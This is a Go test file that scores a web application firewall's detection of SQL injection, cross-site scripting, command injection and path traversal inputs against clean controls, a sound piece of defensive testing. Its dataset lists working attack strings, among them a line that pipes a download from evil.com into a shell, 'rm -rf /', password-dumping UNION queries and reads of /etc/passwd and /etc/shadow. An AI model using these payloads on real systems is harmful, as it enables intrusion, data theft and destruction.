package tests

import (
	"fmt"
	"net/http"
	"testing"

	"noject/internal/waf"
)

type TestCase struct {
	Payload  string
	IsAttack bool
}

func TestSecurityProtectionScore_WAF(t *testing.T) {
	engine := waf.NewEngine(waf.DefaultConfig())

	// Dataset of Traditional Injections & Clean Controls with official CWE codes
	testDataset := map[string][]TestCase{
		"SQL Injection (CWE-89)": {
			// Attacks
			{"' OR '1'='1", true},
			{"1' UNION SELECT null, username, password FROM users --", true},
			{"admin' --", true},
			{"1; DROP TABLE users;", true},
			{"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", true},
			{"' OR 1=1 #", true},
			{"' UNION ALL SELECT 1,2,3,4,5--", true},
			{"10; DELETE FROM accounts WHERE id = 1;", true},
			// Clean Controls
			{"select * from the menu please", false},
			{"union representative meeting notes", false},
			{"update status to complete", false},
			{"how to drop a ball in basketball", false},
			{"insert card into slot", false},
			{"search query for shoes", false},
		},
		"Cross-Site Scripting (CWE-79)": {
			// Attacks
			{"<script>alert(1)</script>", true},
			{"<img src=x onerror=alert(document.cookie)>", true},
			{"javascript:alert('xss')", true},
			{"<svg onload=alert(1)>", true},
			{"<iframe src='javascript:alert(1)'></iframe>", true},
			{"<body onload=alert('test')>", true},
			// Clean Controls
			{"I love <3 coding in Go", false},
			{"Use a script to automate tests", false},
			{"5 < 10 and 10 > 2", false},
			{"Check out this image: photo.jpg", false},
			{"Here is an article about JavaScript frameworks", false},
		},
		"Command Injection (CWE-78)": {
			// Attacks
			{"127.0.0.1; cat /etc/passwd", true},
			{"127.0.0.1 | /bin/sh", true},
			{"target.com $(whoami)", true},
			{"localhost && rm -rf /", true},
			{"8.8.8.8; /usr/bin/id", true},
			{"127.0.0.1; curl http://evil.com/shell | bash", true},
			// Clean Controls
			{"ping 8.8.8.8", false},
			{"echo 'hello world'", false},
			{"pipe operations in unix", false},
			{"calculate 5 && 10 bitwise", false},
			{"user id is 12345", false},
		},
		"Path Traversal (CWE-22)": {
			// Attacks
			{"../../../../etc/passwd", true},
			{"..\\..\\..\\windows\\system32", true},
			{"..%2f..%2f..%2fetc%2fshadow", true},
			{"/download?file=../../app.config", true},
			// Clean Controls
			{"file_v1.0.pdf", false},
			{"docs/user/guide.md", false},
			{"assets/images/logo.png", false},
			{"path/to/my/folder", false},
		},
	}

	fmt.Println("\n========================================================================================================")
	fmt.Println("             NoJect WAF Security Protection & Accuracy Score Matrix (OWASP Benchmark / CWE)            ")
	fmt.Println("========================================================================================================")
	fmt.Printf("| %-32s | %-10s | %-12s | %-12s | %-10s | %-12s |\n", "Threat Category & Standard Code", "Samples", "Block Rate", "False Pos", "F1 Score", "OWASP Youden")
	fmt.Println("|----------------------------------|------------|--------------|--------------|------------|--------------|")

	var totalTP, totalFP, totalTN, totalFN int

	for category, cases := range testDataset {
		var tp, fp, tn, fn int
		for _, tc := range cases {
			headers := http.Header{"User-Agent": []string{"Mozilla/5.0"}}
			res := engine.Inspect(http.MethodPost, "/api/test", tc.Payload, headers, []byte(tc.Payload))

			if tc.IsAttack {
				if res.Blocked {
					tp++
				} else {
					fn++
				}
			} else {
				if res.Blocked {
					fp++
				} else {
					tn++
				}
			}
		}

		totalTP += tp
		totalFP += fp
		totalTN += tn
		totalFN += fn

		blockRate := 0.0
		if (tp + fn) > 0 {
			blockRate = (float64(tp) / float64(tp+fn)) * 100.0
		}

		fpRate := 0.0
		if (fp + tn) > 0 {
			fpRate = (float64(fp) / float64(fp+tn)) * 100.0
		}

		precision := 1.0
		if (tp + fp) > 0 {
			precision = float64(tp) / float64(tp+fp)
		}
		recall := 1.0
		if (tp + fn) > 0 {
			recall = float64(tp) / float64(tp+fn)
		}
		f1 := 0.0
		if (precision + recall) > 0 {
			f1 = 2 * (precision * recall) / (precision + recall) * 100.0
		}
		youden := blockRate - fpRate

		fmt.Printf("| %-32s | %-10d | %-11.1f%% | %-11.1f%% | %-9.1f%% | %-11.1f%% |\n", category, len(cases), blockRate, fpRate, f1, youden)

		if blockRate < 95.0 {
			t.Errorf("category %s block rate below 95%%: %.1f%%", category, blockRate)
		}
		if fpRate > 5.0 {
			t.Errorf("category %s false positive rate above 5%%: %.1f%%", category, fpRate)
		}
	}

	overallPrecision := float64(totalTP) / float64(totalTP+totalFP)
	overallRecall := float64(totalTP) / float64(totalTP+totalFN)
	overallF1 := 2 * (overallPrecision * overallRecall) / (overallPrecision + overallRecall) * 100.0
	overallBlockRate := (float64(totalTP) / float64(totalTP+totalFN)) * 100.0
	overallFPR := (float64(totalFP) / float64(totalFP+totalTN)) * 100.0
	overallYouden := overallBlockRate - overallFPR

	fmt.Println("|----------------------------------|------------|--------------|--------------|------------|--------------|")
	fmt.Printf("| %-32s | %-10d | %-11.1f%% | %-11.1f%% | %-9.1f%% | %-11.1f%% |\n", "OVERALL WAF SECURITY SCORE", totalTP+totalFP+totalTN+totalFN, overallBlockRate, overallFPR, overallF1, overallYouden)
	fmt.Println("========================================================================================================")
}
